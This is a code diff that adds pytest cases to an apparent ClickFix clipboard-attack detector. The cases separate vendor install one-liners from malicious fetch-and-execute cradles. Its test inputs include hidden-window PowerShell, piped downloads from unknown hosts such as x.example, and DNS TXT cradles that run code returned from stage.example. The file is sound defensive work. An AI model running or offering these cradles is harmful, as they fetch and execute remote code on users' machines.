@@ -324,6 +324,82 @@ def test_plain_command_with_run_dialog_lure_is_clickfix():
     assert "clickfix_clipboard_command" in _hits(data)
 
 
+# R-01: package-manager install one-liners are fetch-then-run cradles from the vendor's
+# own installer host; they must not read as critical ClickFix.
+@pytest.mark.parametrize(
+    ("page", "text"),
+    [
+        ("https://brew.sh/", '/bin/bash -c "$(curl -fsSL '
+         'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'),
+        ("https://docs.astral.sh/uv/", "curl -LsSf https://astral.sh/uv/install.sh | sh"),
+        ("https://docs.astral.sh/uv/",
+         'powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"'),
+        ("https://scoop.sh/", "irm get.scoop.sh | iex"),
+        ("https://chocolatey.org/install", "Set-ExecutionPolicy Bypass -Scope Process -Force; "
+         "iex ((New-Object System.Net.WebClient).DownloadString("
+         "'https://community.chocolatey.org/install.ps1'))"),
+        ("https://rustup.rs/", "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"),
+    ],
+)
+def test_homebrew_install_oneliner_is_not_clickfix(page, text):
+    data = _data(page, clipboard=_clip(text))
+    facts = build_facts(data)
+    assert facts["clipboard"]["installer_cradles"] == 1
+    hits = _hits(data)
+    assert "clickfix_clipboard_command" not in hits
+    assert "clipboard_command_write" in hits
+
+
+def test_encoded_powershell_clipboard_is_clickfix_even_on_allowlisted():
+    """An unambiguous trait (hidden window) stays critical, even fetching an installer
+    source from an allowlisted page: the source exemption covers bare cradles only."""
+    text = 'powershell -w hidden -c "irm https://astral.sh/uv/install.ps1 | iex"'
+    data = _data("https://www.bigblog.com/", clipboard=_clip(text))
+    data.allowlisted = {"bigblog.com"}
+    assert build_facts(data)["clipboard"]["clickfix_unambiguous"] == 1
+    assert "clickfix_clipboard_command" in _hits(data)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        # Any repo can be served from raw.githubusercontent.com: only named installers pass.
+        "curl -fsSL https://raw.githubusercontent.com/someone/kit/main/x.sh | sh",
+        # One installer source does not launder a second, unknown one.
+        "irm https://astral.sh/uv/install.ps1 | iex; irm https://x.example/a | iex",
+    ],
+)
+def test_cradle_from_non_installer_source_is_still_clickfix(text):
+    assert "clickfix_clipboard_command" in _hits(_data("https://x.example/", clipboard=_clip(text)))
+
+
+# DE-CFX-009: the stage comes back in a DNS answer and is executed.
+@pytest.mark.parametrize(
+    "text",
+    [
+        'powershell -c "(Resolve-DnsName -Type TXT stage.example -Server 192.0.2.1).Strings'
+        ' | iex"',
+        "cmd /c nslookup -q=txt stage.example 192.0.2.1 | cmd",
+    ],
+)
+def test_dns_cradle_clipboard_is_clickfix(text):
+    data = _data("https://verify.example/", clipboard=_clip(text))
+    assert build_facts(data)["clipboard"]["clickfix_unambiguous"] == 1
+    assert "clickfix_clipboard_command" in _hits(data)
+    from sandbox.analysis.facts import extract_iocs
+
+    iocs = extract_iocs(data, build_facts(data))
+    assert "stage.example" in iocs["domains"]
+    assert "192.0.2.1" in iocs["ips"]
+
+
+@pytest.mark.parametrize("text", ["nslookup example.com", "nslookup example.com | findstr Address"])
+def test_plain_nslookup_is_not_clickfix(text):
+    assert "clickfix_clipboard_command" not in _hits(
+        _data("https://docs.example/", clipboard=_clip(text))
+    )
+
+
 # --- downloads ---------------------------------------------------------------------------
 
 
